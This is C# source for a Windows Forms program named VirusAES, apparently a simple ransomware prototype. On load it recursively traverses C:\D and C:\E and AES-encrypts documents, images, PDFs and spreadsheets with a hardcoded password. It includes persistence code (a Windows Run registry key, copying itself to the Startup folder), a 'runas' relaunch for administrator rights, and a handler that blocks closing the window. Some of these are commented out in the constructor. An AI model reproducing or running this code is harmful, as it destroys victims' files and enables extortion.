using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using AES_File;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Principal;
using System.Diagnostics;
using System.Security.Permissions;
using Microsoft.Win32;

namespace VirusAES
{
    public partial class VirusAES : Form
    {
        public VirusAES()
        {
            InitializeComponent();
            //this.Cursor = Cursors.WaitCursor;
            //this.RunAsAdmin();
            //this.Cursor = Cursors.Default;
            //StartUpWithWindow(Application.ExecutablePath, Application.ProductName);
            //Copyitself();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            AES file = new AES();
            string password = "vudinhquang";
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            AES.ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();

            string[] dir = new string[] { @"C:\D", @"C:\E" };
            foreach(string str in dir)
            {
                EncryptAllFile(str, password);
            }
        }

        private void EncryptAllFile(string path, string password)
        {
            var paths = Traverse(path);
            int num = paths.Count<string>();

            if (num > 1)
            {
                for (int i = 1; i < num; i++)
                {
                    string ex = Path.GetExtension(paths.ElementAt(i));
                    Console.WriteLine(ex);
                    if (".txt .doc .docx .jpg .jpeg .png .pdf .xlsx .xls".Contains(ex.ToLower()))
                    {
                        AES file = new AES();
                        GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
                        file.FileEncrypt(paths.ElementAt(i), password);

                        AES.ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
                        gch.Free();
                    }
                }
            }
        }

        private static IEnumerable<string> Traverse(string rootDirectory)
        {
            IEnumerable<string> files = Enumerable.Empty<string>();
            IEnumerable<string> directories = Enumerable.Empty<string>();
            try
            {
                // The test for UnauthorizedAccessException.
                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, rootDirectory);
                permission.Demand();

                files = Directory.GetFiles(rootDirectory);
                directories = Directory.GetDirectories(rootDirectory);
            }
            catch
            {
                // Ignore folder (access denied).
                rootDirectory = null;
            }

            if (rootDirectory != null)
                yield return rootDirectory;

            foreach (var file in files)
            {
                yield return file;
            }

            // Recursive call for SelectMany.
            var subdirectoryItems = directories.SelectMany(Traverse);
            foreach (var result in subdirectoryItems)
            {
                yield return result;
            }
        }

        private void StartUpWithWindow(string filePath, string nameApp)
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey($"Software\\{nameApp}");
            //mo registry khoi dong cung win
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            //string subkey = "Software\\ManhQuyen";
            try
            {
                //chen gia tri key
                regkey.SetValue("Index", keyvalue);
                
                regstart.SetValue(nameApp, filePath);
                ////dong tien trinh ghi key
                //regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }

        private void RunAsAdmin()
        {
            if (!IsAdministrator())
            {
                // Restart and run as admin
                var exeName = Process.GetCurrentProcess().MainModule.FileName;
                ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
                startInfo.Verb = "runas";
                startInfo.Arguments = "restart";
                Process.Start(startInfo);
            }
        }

        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Copyitself()
        {
            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;

            try
            {
                //COPY THIS PROGRAM TO STARTUP
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                {
                    System.IO.File.Copy(Application.ExecutablePath, Filepath);
                }

            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }
        }

        private void VirusAES_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
